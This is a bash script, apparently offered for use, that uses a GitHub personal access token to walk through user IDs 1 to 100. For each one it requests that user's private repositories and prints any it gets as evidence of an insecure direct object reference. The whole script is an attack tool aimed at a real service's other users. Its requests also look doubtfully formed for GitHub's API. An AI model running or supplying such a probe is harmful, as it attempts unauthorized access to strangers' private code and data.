#!/bin/bash

# GitHub IDOR Hunter
# Requires: GitHub personal access token
# Get token: https://github.com/settings/tokens

TOKEN="$1"
if [ -z "$TOKEN" ]; then
  echo "[!] Usage: ./github-idor-hunt.sh YOUR_GITHUB_TOKEN"
  echo "[!] Get token from: https://github.com/settings/tokens"
  exit 1
fi

BASE_URL="https://api.github.com"

echo "[*] GITHUB IDOR HUNT"
echo "[*] Token: ${TOKEN:0:10}..."
echo ""

# Step 1: Get your user ID
echo "[*] Getting your user ID..."
MY_USER=$(curl -s -H "Authorization: token $TOKEN" "$BASE_URL/user" | jq '.id')
MY_LOGIN=$(curl -s -H "Authorization: token $TOKEN" "$BASE_URL/user" | jq -r '.login')
echo "[*] Your ID: $MY_USER ($MY_LOGIN)"
echo ""

# Step 2: Enumerate sequential user IDs and test for IDOR
echo "[*] Testing sequential user IDs for IDOR..."
echo "[*] Looking for unauthorized access to private repos..."
echo ""

for user_id in {1..100}; do
  # Skip your own ID
  if [ "$user_id" == "$MY_USER" ]; then
    continue
  fi
  
  # Test if we can access their private repos
  response=$(curl -s -H "Authorization: token $TOKEN" "$BASE_URL/users/$user_id/repos?type=private&per_page=1" 2>/dev/null)
  
  # Check if we got private repos (IDOR found)
  if echo "$response" | jq -e '.[0].private == true' > /dev/null 2>&1; then
    echo "[!] IDOR FOUND - User ID $user_id"
    echo "[!] Accessed private repos:"
    echo "$response" | jq '.[] | {id, name, private, owner}'
    echo ""
  fi
done

echo "[*] Hunt complete"
